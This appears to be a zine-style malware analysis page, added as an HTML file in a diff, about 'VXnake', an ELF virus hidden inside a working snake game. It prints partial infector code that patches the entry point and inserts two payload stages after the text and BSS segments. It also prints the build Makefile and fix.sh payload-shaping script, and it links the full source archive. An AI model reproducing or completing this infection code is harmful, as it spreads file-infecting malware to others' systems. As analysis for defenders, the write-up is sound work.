@@ -1,0 +1,268 @@
+<html>
+<head>
+<title>A Brief Tour of VXnake</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                                 ┌───────────────────────┐
+                                                                 ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                                 │ █   █ █ █ █   █       │
+                                                                 │ █   █ █ █ █▀▀▀▀       │
+                                                                 │ █   █   █ █     ▄     │
+                                                                 │                 ▄▄▄▄▄ │
+                                                                 │                 █   █ │
+                                                                 │                 █   █ │
+                                                                 │                 █▄▄▄█ │
+                                                                 │                 ▄   ▄ │
+                                                                 │                 █   █ │
+                                                                 │                 █   █ │
+                                                                 │                 █▄▄▄█ │
+                                                                 │                 ▄▄▄▄▄ │
+                                                                 │                   █   │
+A Brief Tour of VXnake by anonymous_                             │                   █   │
+~ hexadecim8                                                     └───────────────────█ ──┘
+
+Follow along with the code found here: <a href="./vxnake1.tar.gz">vxnake1.tar.gz</a>
+
+00000000000
+00/Intro\00
+00000000000
+
+I've been poking around the TMP clubhouse for a while, and the crew decided to give me
+the oddest bit of ELF they could find for my first write up. For anyone who had the 
+Nokia phone in middle school (you know the one) you'll remember the classic game "snake".
+Well, this game of snake comes with some added elf excitement.
+
+This is a brief introduction to this code and a more in-depth analysis may happen at a 
+later date.
+
+
+11111111111111111111
+11/File Structure\11
+11111111111111111111
+
+The program drops with a single directory aptly named 'virus'. The following file struct
+should help apprise the reader of all of the relevant locations:
+
+Virus
+--&gt; build.sh
+--&gt; clean.sh
+--&gt; gen_payload
+----&gt; crt0.s
+----&gt; fix.sh
+----&gt; Makefile
+----&gt; politic.c
+----&gt; wrapper.h
+----&gt; include
+--&gt; gripe
+----&gt; host.c
+----&gt; inf.c
+----&gt; Makefile
+--&gt; second_stage
+----&gt; crt0.s
+----&gt; fix.sh
+----&gt; Makefile
+----&gt; politic.c
+----&gt; wrapper.h
+----&gt; include
+--&gt; snake
+----&gt; bkp
+----&gt; LICENSE
+----&gt; link.ld
+----&gt; Makefile
+----&gt; ncurses_include
+----&gt; ncurses_lib
+----&gt; README.md
+----&gt; src
+------&gt; backend.c
+------&gt; backend.h
+------&gt; frontend.c
+------&gt; frontend.h
+------&gt; main.c
+
+
+222222222222222
+22/Questions\22
+222222222222222
+
+Sure, we could start by asking questions. Of course a few come to mind such as, 'why would
+you go through the trouble of including a fully implemented game of snake for an ELF 
+virus?'. We may never know the answer, but the code is indeed fully implemented:
+
+---/begin code break\---
+
+enum Status move_snake(Board* board, enum Direction dir) {
+  // Create a new beginning. Check boundaries.
+  PointList* beginning = next_move(board, dir);
+  if (beginning == NULL) {
+  }
+
+  // If we've gone backwards, don't do anything
+  if (board-&gt;snake-&gt;next && is_same_place(beginning, board-&gt;snake-&gt;next)) {
+    beginning-&gt;next = NULL;
+    free(beginning);
+    return SUCCESS;
+
+   ...
+
+---/end code break\---
+
+So we know that the program has a fully-built game, but what about the virus part? Under 
+the 'gripe' directory, there is a file called 'inf.c' that appears to be the first generation
+infector.
+
+In inf.c, we can see that the struct 'politic_entry' is used to help deliver the payload.
+
+---/begin code break\---
+
+new_entry = phdr[i].p_vaddr + phdr[i].p_memsz + politic_entry;
+
+---/end code break\---
+
+
+It's an odd bit of code, but does some more fun and interesting things later on.
+
+3333333333333333333333333
+33/Virus Functionality\33
+3333333333333333333333333
+
+The virus and entrypoints are encapsulated in the following lines:
+
+---/begin code break\---
+
+//Patching the jmp ORIGINAL_ENTRY_POINT
+    *(uint32_t *)real_entry = -end_of_text + original_entry - patch_offset - 4;
+    //Saving the offset of patch in the payload
+    *(uint32_t *)(real_entry + 4) = (uint8_t *)real_entry - politic;
+    //Saving offset of payload entry on payload
+    *(uint64_t *)(real_entry + 8) = politic_entry;
+    //Saving the payload size in payload
+    *(uint64_t *)(real_entry + 16) = politic_len;
+    //Patch the addr of the second payload
+    *(uint64_t *)(real_entry + 24) = (data_vaddr - new_entry) + bss_size;
+    //Save second stage entry
+    *(uint64_t *)(real_entry + 32) = payload_entry;
+    //Save second stage len
+    *(uint64_t *)(real_entry + 40) = payload_len;
+
+    printf("offset from end of text to end_of_data = %lu\n", end_of_data - end_of_text);
+    printf("off end_datavaddr - newentry =%lu\n", data_vaddr - new_entry);
+    ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC,
+               S_IRUSR | S_IXUSR | S_IWUSR);
+
+
+    write(ofd, host_mem, end_of_text);
+    //[EHDR][PHDRs][TEXT]
+    write(ofd, politic, politic_len);
+    //[EHDR][PHDRs][TEXT][VIRUS]
+    lseek(ofd, PAGE_SIZE - politic_len, SEEK_CUR);
+    //[EHDR][PHDRs][TEXT][VIRUS+PAD]
+    write(ofd, host_mem + end_of_text, end_of_data - end_of_text);
+    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA]
+    lseek(ofd, bss_size, SEEK_CUR);
+    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS]
+    write(ofd, payload, payload_len);
+    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS][VIRUS2]
+    write(ofd, host_mem + end_of_data, st.st_size - end_of_data);
+    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS][VIRUS2][SHDRs]
+
+---/end code break\---
+
+The VIRUS code at the beginning is added to the end of the text segment using the "Silvio" 
+method. VIRUS uses mmap to load VIRUS2 from the data segment into a memory
+location that is executable, so no permissions changes are needed to the data segment.
+
+You may have also noticed some .sh files in the file struct at the top of this write-up.
+These scripts help format the data to be inserted as the payload into memory.
+
+4444444444444444444444
+44/Forbidden Linker\44
+4444444444444444444444
+
+Another thing you may have noticed was the linker script under the snake sub-directory. 
+The linker script does what all linker scripts are designed to do - bring all of the 
+different C and assembly files together to create an executable (in this case, an ELF 
+exe of course!) which on its own wouldn't be all that weird, except for what happens next
+in this Makefile;
+
+---/begin code break\---
+
+CFLAGS=-Wl,-N -fno-builtin -nostdlib -nodefaultlibs -fPIC -pie -mmanual-endbr\
+ -fdata-sections -ffunction-sections -s 
+all:
+    gcc  -c -w $(CFLAGS) -o payload.o payload.c
+    
+    objcopy --remove-section=.note.GNU-stack payload.o
+    objcopy --remove-section=.eh_frame payload.o
+    
+    ld -s -S -e payload --hash-style=sysv  -N --no-eh-frame-hdr --build-id=none --gc-sections\
+        -o payload payload.o --no-dynamic-linker -pie -pic
+
+    objcopy --remove-section=.comment payload
+    strip -s payload
+    strip -R .dynamic payload
+    strip -R .dynsym payload
+    strip -R .dynstr payload
+    strip -R .eh_frame payload
+    
+    bash fix.sh
+
+---/end code break\---
+
+It is interesting and slightly unconventional (although perfecly functional) to see
+objcopy being used like this inside a Makefile. But wait, there's more!
+
+
+5555555555555555555555555555
+55/Forbidden Shell Script\55
+5555555555555555555555555555
+
+You'd think that building the executable would be the end of the story, but VXsnake is not
+yet ready to give up the rest of its secrets. Those secrets lie in the fix.sh script under
+the second_stage subdirectory:
+
+---/begin code break\---
+#!/bin/bash
+
+#strip shstrtab section and section headers
+dd if=./payload of=./TMpayload bs=1 \
+    count=$(readelf -S payload | grep shstrtab | awk '{print "0x"$6}' | printf "%d" $(cat /dev/stdin))
+
+#ehdr-&gt;e_shnum = 0;
+#ehdr-&gt;e_shstrndx = 0;
+printf "\x00\x00\x00\x00" \
+    | dd if=/dev/stdin of=./TMpayload seek=60 bs=1 count=4 conv=notrunc
+
+#ehdr-&gt;e_shoff = 0;
+printf "\x00\x00\x00\00\x00\x00\x00\00" \
+    | dd if=/dev/stdin of=./TMpayload seek=40 bs=1 count=8 conv=notrunc
+
+readelf -h TMpayload | grep Entry | awk '{print $4}' |\
+ printf "unsigned long payload_entry = 0x%x;\x0a" $(($(cat /dev/stdin)-(64+2*56)-0x400000)) &gt; payload.h
+
+dd if=./TMpayload of=./payload skip=$((64+2*56)) bs=1
+
+chmod +x payload
+xxd -i payload &gt;&gt; payload.h
+
+---/end code break\---
+
+The most fun part about fix.sh is the very last two lines where the payload executable 
+generated by the linker  script is then rebuilt into C shellscript.
+
+
+666666666666
+66/Return\66
+666666666666
+
+What a ride! There are some additional items involved in VXsnake that we, honestly, have
+not yet figured out.
+
+What VXsnake does do is show just how dynamic ELF builds can be, and how many twists and
+turns code compilation can take. Malware analysts in particular should take note of some
+of the techniques used by VXsnake to better understand just how convoluted ELF malware 
+can be.
+
+</pre></div></body>
